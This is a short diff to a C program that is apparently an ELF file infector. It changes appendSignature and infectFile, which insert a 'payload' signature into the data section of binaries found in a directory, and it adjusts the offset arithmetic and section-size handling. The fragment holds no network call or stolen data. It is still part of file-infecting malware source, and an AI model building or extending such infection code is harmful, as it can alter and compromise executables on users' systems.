@@ -153,14 +153,14 @@ static int  writeToFile(const char *dirname, const char *filename, struct bfile 
 
 static int  appendSignature(struct bfile file, Elf64_Shdr *dataHeader) {
   size_t  i;
-  char    *tmp;
+  void    *tmp;
   size_t  toAdd;
   size_t  total;
 
   i = file.size - 1;
-  tmp = (char *)file.header;
+  tmp = file.header;
   toAdd = strlen(payload) + 1;
-  total = file.size - (dataHeader->sh_offset + dataHeader->sh_size) - 1;
+  total = file.size - (dataHeader->sh_offset + dataHeader->sh_size);
   memmove(tmp + i + toAdd - total, tmp + i - total, total);
   i -= total - 1;
   memcpy(tmp + i, payload, toAdd);
@@ -177,7 +177,6 @@ static int  infectFile(const char *dirname, struct dirent *file) {
     return (0);
   dprintf(1, "File %s is compatible\n", file->d_name);
   data = getDataSectionHeader(header.header);
-  data->sh_size += strlen(payload) + 1;
   size_t  offset;
   offset = data->sh_offset;
   appendSignature(header, data);
